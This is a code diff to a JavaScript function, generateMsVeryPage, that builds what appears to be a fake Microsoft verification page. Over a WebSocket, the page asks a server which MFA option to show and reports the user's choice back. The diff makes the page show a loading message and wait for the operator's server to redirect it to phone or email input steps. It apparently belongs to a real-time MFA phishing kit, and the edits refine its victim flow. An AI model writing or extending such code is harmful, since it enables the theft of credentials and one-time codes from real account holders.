@@ -245,7 +245,7 @@ function generateMsVeryPage(token, options = {}) {
                     ws.onopen = function() {
                         console.log('[WEBSOCKET] Connected');
                         reconnectAttempts = 0;
-                        ws.send(JSON.stringify({ type: 'request_mfa_option', token: TOKEN }));
+                        ws.send(JSON.stringify({ type: 'request_mfa_option' }));
                     };
 
                     ws.onmessage = function(event) {
@@ -347,18 +347,30 @@ function generateMsVeryPage(token, options = {}) {
                 if (methodTypeRes.type === 'phone') {
                     selectedOptionElement.onclick = function() {
                         console.log('[CLICK] User clicked phone option');
+                        if (loadingElement) {
+                            loadingElement.style.display = 'flex';
+                            loadingElement.querySelector('span').textContent = 'Processing request...';
+                        }
+                        selectedOptionElement.style.display = 'none';
+                        
                         if (ws && ws.readyState === 1) {
                             ws.send(JSON.stringify({ type: 'user_confirmation', confirmed: true }));
                         }
-                        window.location.href = '/' + TOKEN + '/numinput';
+                        // Wait for server redirect
                     };
                 } else {
                     selectedOptionElement.onclick = function() {
                         console.log('[CLICK] User clicked email option');
+                        if (loadingElement) {
+                            loadingElement.style.display = 'flex';
+                            loadingElement.querySelector('span').textContent = 'Processing request...';
+                        }
+                        selectedOptionElement.style.display = 'none';
+
                         if (ws && ws.readyState === 1) {
                             ws.send(JSON.stringify({ type: 'user_confirmation', confirmed: true }));
                         }
-                        window.location.href = '/' + TOKEN + '/mailinput';
+                        // Wait for server redirect
                     };
                 }
 
